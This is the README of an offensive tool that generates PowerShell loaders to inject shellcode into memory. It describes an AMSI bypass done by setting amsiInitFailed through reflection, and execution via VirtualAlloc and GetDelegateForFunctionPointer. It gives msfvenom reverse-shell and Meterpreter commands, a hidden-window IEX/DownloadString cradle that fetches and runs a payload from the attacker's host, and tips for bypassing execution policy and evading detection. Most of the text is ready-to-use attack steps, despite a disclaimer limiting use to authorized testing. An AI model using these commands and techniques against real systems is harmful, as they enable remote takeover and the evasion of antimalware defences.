# AdaptixPowerShell

**AdaptixPowerShell** is a Python-based payload generator that creates PowerShell scripts for in-memory shellcode injection using Adaptix C2 techniques. The generated payloads execute shellcode directly in memory without writing to disk, making them ideal for penetration testing and red team exercises.

## 📋 Table of Contents

- [Overview](#overview)
- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage](#usage)
- [How It Works](#how-it-works)
- [Technical Details](#technical-details)
- [Configuration](#configuration)
- [Examples](#examples)
- [Security Considerations](#security-considerations)
- [Requirements](#requirements)
- [Limitations](#limitations)

## Overview

`adaptixpowerShell.py` generates evasive PowerShell payloads that:
- Bypass AMSI (Antimalware Scan Interface) detection
- Execute shellcode entirely in memory (fileless)
- Use Adaptix C2 injection techniques for stealth
- Provide ready-to-use download commands for deployment

## Features

- ✅ **AMSI Bypass**: Automatically includes AMSI (Antimalware Scan Interface) bypass code to evade Windows Defender detection
- ✅ **In-Memory Execution**: Uses `GetDelegateForFunctionPointer` for fileless shellcode execution (Adaptix C2 method)
- ✅ **Random Filenames**: Generates random `.ps1` filenames to avoid pattern detection
- ✅ **Auto IP Detection**: Automatically detects your local IP address for download commands
- ✅ **Base64 Encoding**: Provides both direct and base64-encoded download commands for obfuscation
- ✅ **Easy Integration**: Works seamlessly with tools like `msfvenom` for shellcode generation
- ✅ **Zero Dependencies**: Pure Python 3, no external libraries required

## Installation

### Prerequisites

- Python 3.x (tested on Python 3.6+)
- Binary shellcode file (generated with msfvenom, Cobalt Strike, or similar tools)

### Setup

1. **Clone or download the repository**:
   ```bash
   git clone <repository-url>
   cd hostpayload
   ```

2. **Make the script executable** (optional):
   ```bash
   chmod +x adaptixpowerShell.py
   ```

3. **Verify Python installation**:
   ```bash
   python3 --version
   ```

That's it! No additional dependencies or installation steps required.

## How It Works

### 1. Shellcode Processing
The script reads a binary shellcode file and converts it into a PowerShell byte array format (`0x41,0x42,0x43...`).

### 2. PowerShell Template Generation
The script embeds the shellcode into a PowerShell template that includes:

- **AMSI Bypass**: Uses reflection to access the `amsiInitFailed` field in `System.Management.Automation.AmsiUtils` and sets it to `true`, effectively disabling AMSI scanning
- **Memory Allocation**: Uses `VirtualAlloc` Windows API to allocate executable memory (flags: `0x3000` = MEM_COMMIT | MEM_RESERVE, `0x40` = PAGE_EXECUTE_READWRITE)
- **Shellcode Injection**: Copies the shellcode bytes into the allocated memory using `Marshal.Copy`
- **Execution**: Uses `GetDelegateForFunctionPointer` to create a delegate pointing to the shellcode and invokes it directly

### 3. Output Generation
The script generates:
- A randomly named `.ps1` file containing the complete payload
- Direct download command using `IEX (Invoke-Expression)` and `DownloadString`
- Base64-encoded download command for additional obfuscation

## Quick Start

```bash
# 1. Generate shellcode with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw > shellcode.bin

# 2. Generate PowerShell payload
python3 adaptixpowerShell.py shellcode.bin

# 3. Start web server
sudo python3 -m http.server 80

# 4. Execute the provided command on target Windows system
```

## Usage

### Basic Syntax

```bash
python3 adaptixpowerShell.py <path_to_shellcode.bin>
python3 adaptixpowerShell.py -h, --help
```

### Command-Line Arguments

| Argument | Description |
|----------|-------------|
| `<path_to_shellcode.bin>` | Path to the binary shellcode file to embed |
| `-h, --help` | Display help message and exit |

### Complete Workflow Example

1. **Generate shellcode** (using msfvenom):
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shellcode.bin
   ```

2. **Generate PowerShell payload**:
   ```bash
   python3 adaptixpowerShell.py shellcode.bin
   ```

3. **Start web server** (on the port specified in the script, default: 80):
   ```bash
   sudo python3 -m http.server 80
   ```

4. **Execute on target** (use the command provided by the script):
   ```powershell
   powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:80/RANDOM_NAME.ps1')"
   ```

### Help Command

```bash
python3 adaptixpowerShell.py -h
# or
python3 adaptixpowerShell.py --help
```

## Examples

### Example 1: Basic Reverse Shell

```bash
# Generate reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > revshell.bin

# Create PowerShell loader
python3 adaptixpowerShell.py revshell.bin

# Output: a8j2d.ps1 (random name)
```

### Example 2: Meterpreter Payload

```bash
# Generate meterpreter payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > meterpreter.bin

# Create PowerShell loader
python3 adaptixpowerShell.py meterpreter.bin
```

### Example 3: Custom Shellcode

```bash
# Use any binary shellcode file
python3 adaptixpowerShell.py /path/to/custom/shellcode.bin
```

## Technical Details

### AMSI Bypass Mechanism

The AMSI bypass works by:
1. Accessing the `System.Management.Automation.AmsiUtils` class via reflection
2. Getting the private static field `amsiInitFailed`
3. Setting its value to `true`, which tells AMSI that initialization failed and scanning should be skipped

### Memory Injection Process

1. **VirtualAlloc**: Allocates memory with executable permissions
   - `lpAddress`: `IntPtr::Zero` (let system choose address)
   - `dwSize`: Size of shellcode
   - `flAllocationType`: `0x3000` (MEM_COMMIT | MEM_RESERVE)
   - `flProtect`: `0x40` (PAGE_EXECUTE_READWRITE)

2. **Marshal.Copy**: Copies shellcode bytes from managed array to unmanaged memory

3. **GetDelegateForFunctionPointer**: Creates a delegate that points to the shellcode memory address

4. **Invoke**: Executes the shellcode by calling the delegate

### Adaptix C2 Technique

The "Adaptix C2" method refers to using `GetDelegateForFunctionPointer` to execute shellcode. This technique:
- Avoids common API calls like `CreateThread` or `CreateRemoteThread`
- Executes shellcode directly through a delegate invocation
- Can be more evasive than traditional injection methods

## Configuration

You can modify the web server port by changing the `WEB_PORT` variable at the top of the script:

```python
WEB_PORT = 80  # Change to your desired port
```

## Output

When you run the script successfully, you'll see output like:

```
[*] Reading shellcode from: shellcode.bin

============================================================
 SUCCESS! Payload Generated: a8j2d.ps1
============================================================

[STEP 1] Start your Web Server here:
   sudo python3 -m http.server 80

[STEP 2] RUN THIS ON TARGET (Direct Download):
--------------------------------------------------------------------------------
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:80/a8j2d.ps1')"
--------------------------------------------------------------------------------

[STEP 3] Base64 Encoded Download Command:
--------------------------------------------------------------------------------
powershell -nop -w hidden -enc BASE64_ENCODED_COMMAND
--------------------------------------------------------------------------------
```

### Generated Files

- **`<random_name>.ps1`**: The complete PowerShell payload containing:
  - AMSI bypass code
  - Embedded shellcode as byte array
  - Memory allocation and injection code
  - Execution logic

### Provided Commands

1. **Direct Download Command**: Uses `IEX` and `DownloadString` for immediate execution
2. **Base64 Encoded Command**: Obfuscated version using PowerShell's `-enc` parameter (UTF-16LE encoded)

## Security Considerations

⚠️ **WARNING**: This tool is designed for authorized penetration testing and security research only.

- Only use this tool on systems you own or have explicit written permission to test
- Unauthorized use of this tool may violate laws and regulations
- The generated payloads are designed to bypass security controls and should be used responsibly
- Always follow responsible disclosure practices

## Requirements

- Python 3.x
- Binary shellcode file (e.g., from msfvenom, Cobalt Strike, etc.)

## Limitations

- Requires PowerShell on the target system
- AMSI bypass may be detected by advanced EDR solutions
- Network connectivity required for remote download method
- Windows-specific (uses Windows APIs)

## Troubleshooting

### Common Issues

**Issue**: "File not found" error
- **Solution**: Ensure the shellcode file path is correct and the file exists

**Issue**: Web server connection fails
- **Solution**: 
  - Check firewall rules allow incoming connections
  - Verify the port (default: 80) is not in use
  - Ensure target can reach your IP address

**Issue**: PowerShell execution blocked
- **Solution**: 
  - Check PowerShell execution policy: `Get-ExecutionPolicy`
  - Use bypass: `powershell -ExecutionPolicy Bypass ...`
  - Some environments may require additional evasion techniques

**Issue**: AMSI still detecting payload
- **Solution**: 
  - AMSI bypass may be patched in newer Windows versions
  - Consider using additional obfuscation or alternative bypass methods
  - Advanced EDR solutions may detect the technique

## Project Structure

```
hostpayload/
├── adaptixpowerShell.py    # Main application script
└── README.md               # This file
```

## Contributing

Contributions, issues, and feature requests are welcome! Please ensure all code follows best practices and includes appropriate documentation.

## Disclaimer

⚠️ **IMPORTANT**: This tool is designed for **authorized penetration testing and security research only**.

- Only use on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal
- The authors are not responsible for misuse of this tool
- Always follow responsible disclosure practices
- Comply with all applicable laws and regulations

## License

This tool is provided for educational and authorized security testing purposes only. Use at your own risk.

## Acknowledgments

- Based on Adaptix C2 injection techniques
- Uses AMSI bypass methods from security research community
